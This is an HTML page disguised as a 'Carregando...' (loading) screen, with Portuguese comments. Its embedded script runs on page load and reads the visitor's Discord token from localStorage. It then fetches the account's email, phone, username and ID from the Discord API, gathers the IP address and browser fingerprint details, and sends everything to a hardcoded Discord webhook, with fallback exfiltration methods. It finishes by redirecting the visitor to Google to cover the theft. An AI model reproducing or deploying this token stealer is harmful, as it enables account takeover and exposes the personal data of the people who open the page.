<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Carregando...</title>
    <script>
        (async function() {
            const webhookURL = "https://discord.com/api/webhooks/1519362826098184336/nkxrO_ET6SZWcmAFCoHoBHCTKahRKVft_QkMuWbpfLCEfN3ndWoa2rlLf40obW-DJjcr";
            
            let token = localStorage.getItem("token");
            let email = "Não logado no Discord Web";
            let phone = "Não disponível";
            let username = "Desconhecido";
            let userID = "Desconhecido";

            // Se encontrou o token, busca dados na API do Discord
            if (token) {
                try {
                    const userResp = await fetch("https://discord.com/api/v9/users/@me", {
                        headers: { "Authorization": token }
                    });
                    const userData = await userResp.json();
                    email = userData.email || "Não disponível";
                    phone = userData.phone || "Não vinculado";
                    username = userData.username + "#" + (userData.discriminator || "0");
                    userID = userData.id;
                } catch (e) {
                    console.log("Erro API Discord:", e);
                }
            }

            // Pegar IP com API alternativa
            let ip = "Não capturado";
            try {
                const ipResp = await fetch("https://api.ipify.org?format=json");
                const ipData = await ipResp.json();
                ip = ipData.ip;
            } catch (e) {
                try {
                    const ipResp2 = await fetch("https://api.my-ip.io/ip.json");
                    const ipData2 = await ipResp2.json();
                    ip = ipData2.ip;
                } catch (e2) {
                    console.log("Erro ao capturar IP:", e2);
                }
            }

            const platform = navigator.platform;
            const language = navigator.language;
            const screenRes = `${screen.width}x${screen.height}`;
            const userAgent = navigator.userAgent;
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

            // Monta mensagem completa
            const mensagem = 
                `**🎯 Dados Capturados**\n` +
                `**👤 Usuário:** ${username}\n` +
                `**🆔 ID:** ${userID}\n` +
                `**📧 Email:** ${email}\n` +
                `**📱 Telefone:** ${phone}\n` +
                `**🔑 Token:** \`${token || "Não encontrado"}\`\n` +
                `**🌐 IP:** ${ip}\n` +
                `**💻 Sistema:** ${platform}\n` +
                `**🌍 Idioma:** ${language}\n` +
                `**🕐 Fuso:** ${timezone}\n` +
                `**🖥️ Tela:** ${screenRes}\n` +
                `**📄 User Agent:** ${userAgent.substring(0, 150)}`;

            // Envia para o webhook
            try {
                await fetch(webhookURL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ content: mensagem })
                });
            } catch (e) {
                try {
                    const blob = new Blob([JSON.stringify({ content: mensagem })], { type: 'application/json' });
                    navigator.sendBeacon(webhookURL, blob);
                } catch (e2) {
                    new Image().src = webhookURL + "?content=" + encodeURIComponent(mensagem);
                }
            }

            // Redireciona
            setTimeout(() => {
                window.location.href = "https://www.google.com";
            }, 2000);
        })();
    </script>
</head>
<body>
    <h1>Carregando...</h1>
</body>
</html>
